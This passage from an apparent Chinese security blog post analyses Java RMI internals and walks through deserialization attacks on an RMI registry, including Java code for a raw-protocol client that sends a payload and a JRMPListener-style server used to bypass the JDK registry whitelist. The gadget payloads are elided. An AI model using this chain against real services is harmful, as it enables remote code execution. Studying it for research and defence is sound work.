            } catch (ClassNotFoundException var34) {
                throw new UnmarshalException("error unmarshalling arguments", var34);
            } finally {
                var2.releaseInputStream();
            }
            Object var41;
            try {
                var41 = var8.invoke(var1, var10);
            } catch (InvocationTargetException var32) {
                throw var32.getTargetException();
            }
            try {
                ObjectOutput var12 = var2.getResultStream(true);
                Class var13 = var8.getReturnType();
                if (var13 != Void.TYPE) {
                    marshalValue(var13, var41, var12);
                }
            } catch (IOException var31) {
                throw new MarshalException("error marshalling return", var31);
            }
        } catch (Throwable var37) {
            Object var6 = var37;
            this.logCallException(var37);
            ObjectOutput var7 = var2.getResultStream(false);
            if (var37 instanceof Error) {
                var6 = new ServerError("Error occurred in server thread", (Error)var37);
            } else if (var37 instanceof RemoteException) {
                var6 = new ServerException("RemoteException occurred in server thread", (Exception)var37);
            }
            if (suppressStackTraces) {
                clearStackTraces((Throwable)var6);
            }
            var7.writeObject(var6);
        } finally {
            var2.releaseInputStream();
            var2.releaseOutputStream();
        }
    }
通过对源码阅读，对 `RMI` 通信过程有了基本了解。大致流程：服务端调用 `bind` 方法会在注册中心注册服务。客户端首先和注册中心通信，通过
`lookup` 方法从注册服务（存储在 `Hashtable`
中）获取到代理对象，客户端根据代理对象信息和服务端建立新的通信。服务端通过反射执行本地方法将结果返回给客户端。
## **RMI 反序列化**
在源码中可以看到注册中心、服务端、客户端三者之间通信都会涉及序列化传输二进制数据。所以我们可以根据 `RMI`
的通信流程构造自己的请求和靶机通信，也能避免被反打的可能。`ysoserial` 项目中 `JRMPListener` 利用模块正是重写了 `RMI`
通信的逻辑。
依据上面对 `bind` 的流程分析，简单重写了 socket 通信
register 模拟注册中心
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class register {
        public static void main(String[] args) {
            Registry registry = null;
            try {
                registry = LocateRegistry.createRegistry(1099);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
            while (true);
        }
    }
simulationRmi 模拟服务端
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import sun.rmi.server.MarshalOutputStream;
    import sun.rmi.server.MarshalInputStream;
    import sun.rmi.transport.tcp.TCPChannel;
    import sun.rmi.transport.tcp.TCPConnection;
    import sun.rmi.transport.tcp.TCPEndpoint;
    import sun.rmi.transport.tcp.TCPTransport;
    import java.io.DataOutputStream;
    import java.io.InputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.net.Socket;
    import java.rmi.Remote;
    import java.rmi.server.RMIClassLoader;
    import java.util.HashMap;
    import java.util.Map;
    public class simulationRmi {
        public static void main(String[] args) throws Exception {
            Socket socket = new Socket("127.0.0.1", 1099);
            DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
            dos.writeInt(1246907721);
            dos.writeShort(2);
            dos.writeByte(75);
            dos.flush();
            dos.writeUTF("10.10.10.1");
            dos.writeInt(0);
            dos.flush();
            dos.write(80);
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeLong(0);
            oos.writeInt(0);
            oos.writeLong(0);
            oos.writeShort(0);
            oos.writeInt(0);
            oos.writeLong(4905912898345647071L);
            oos.flush();
            MarOutputStream mos = new MarOutputStream(socket.getOutputStream());
            mos.writeObject(generateRemote());
        }
        public static Remote generateRemote() throws Exception {
            .... // 如：CommonsCollections 5 payload 等等
            return remote;
        }
    }
MarOutputStream 对写入的序列化数据做处理（模拟原有的序列化类）
    import sun.rmi.transport.ObjectTable;
    import sun.rmi.transport.Target;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.io.OutputStream;
    import java.rmi.Remote;
    import java.rmi.server.RMIClassLoader;
    import java.rmi.server.RemoteStub;
    import java.security.AccessController;
    import java.security.PrivilegedAction;
    public class MarOutputStream extends ObjectOutputStream {
        public MarOutputStream(OutputStream var1) throws IOException {
            this(var1, 1);
        }
        public MarOutputStream(OutputStream var1, int var2) throws IOException {
            super(var1);
            this.useProtocolVersion(var2);
            AccessController.doPrivileged(new PrivilegedAction() {
                public Void run() {
                    MarOutputStream.this.enableReplaceObject(true);
                    System.out.println("AccessController.doPrivileged");
                    return null;
                }
            });
        }
        protected final Object replaceObject(Object var1) throws IOException {
            if (var1 instanceof Remote && !(var1 instanceof RemoteStub)) {
                Target var2 = ObjectTable.getTarget((Remote)var1);
                System.out.println("var2：" + var2);
                if (var2 != null) {
                    System.out.println("var2.getStub()：" + var2.getStub());
                    return var2.getStub();
                }
            }
            System.out.println("var1 :" + var1);
            return var1;
        }
        protected void annotateClass(Class var1) throws IOException {
            System.out.println("annotateClass" + var1);
            this.writeLocation(RMIClassLoader.getClassAnnotation(var1));
        }
        protected void annotateProxyClass(Class var1) throws IOException {
            System.out.println("annotateProxyClass" + var1);
            this.annotateClass(var1);
        }
        protected void writeLocation(String var1) throws IOException {
            System.out.println("writeLocation" + var1);
            this.writeObject(var1);
        }
    }
JDK 在 jdk8u121 版本后加入了白名单机制，在对接收的数据反序列化时进行了调用 `registryFilter`
方法对反序列化的类做判断，不满足则抛出异常。threedr3am 师傅已经做过分析了，本处不再详细叙述。`ysoserial` 项目中
`payloads.JRMPClient` 模块正是对白名单机制的绕过。利用场景：当目标通过
`LocateRegistry.createRegistry(1099);` 创建了注册服务时，首先外网开启一个类似 `JRMPListener` 模块的
`ServerSocket` 接收和处理请求。然后给目标传输一个 `payloads.JRMPClient` 模块的序列化对象，目标通过对
`RemoteObject` 的反序列化和刚才外网 `JRMPListener` 模块开启的 `ServerSocket`
服务建立通信，`JRMPListener` 模块给目标发送 `payload` 即可。
目标 `register` 服务
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class register {
        public static void main(String[] args) {
            //注册管理器
            Registry registry = null;
            try {
                //创建一个服务注册管理器
                registry = LocateRegistry.createRegistry(1099);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
            while (true);
        }
    }
外网 `JRMPListener`
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.*;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.net.ServerSocket;
    import java.net.Socket;
    import java.rmi.Remote;
    import java.util.HashMap;
    import java.util.Map;
    public class JRMPServer {
        public static void main(String[] args) throws Exception {
            ServerSocket ss = new ServerSocket(8899);
            Socket s;
            while (( s = ss.accept() ) != null){
                System.out.println("accept");
                DataInputStream dis = new DataInputStream(s.getInputStream());
                dis.readInt();
                dis.readShort();
                dis.readByte();
                DataOutputStream dos = new DataOutputStream(s.getOutputStream());
                dos.writeByte(78);
                dos.writeUTF("127.0.0.1");
                dos.writeInt(1099);
                dis.readUTF();
                dis.readInt();
                dis.read();
                ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
                ois.readLong();
                ois.readInt();
                ois.readLong();
                ois.readShort();
                ois.readInt();
                ois.readLong();
                dos.writeByte(81);
                ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream());
                oos.writeByte(2);
                oos.writeInt(0);
                oos.writeLong(0);
                oos.writeShort(0);
                MarOutputStream mos = new MarOutputStream(s.getOutputStream());
                try {
                    mos.writeObject(generateRemote());
                }catch (Exception e){
                    System.out.println("aaa");
                }
            }
        }
        public static Remote generateRemote() throws Exception {
            .... // 如：CommonsCollections 5 payload 等等
            Remote remote = Remote.class.cast(Proxy.newProxyInstance(Server.class.getClassLoader(), new Class[] {Remote.class}, obj));
            return remote;
        }
    }
给目标发送 `RemoteObjectInvocationHandler` 序列化对象
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    public class Client {
        public static void main(String[] args) throws Exception{
            Registry registry = null;
            try {
                registry = LocateRegistry.getRegistry("127.0.0.1",1099);
                registry.bind("ffff", generate());
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }
        public static Remote generate(){
            ObjID oi = new ObjID(0);
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 8899);
            LiveRef lr = new LiveRef(oi, te, false);
            UnicastRef us = new UnicastRef(lr);
              roih = new RemoteObjectInvocationHandler(us);
            Remote rm = (Remote) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[]{Remote.class}, roih);
            return rm;
        }
    }
## **参考**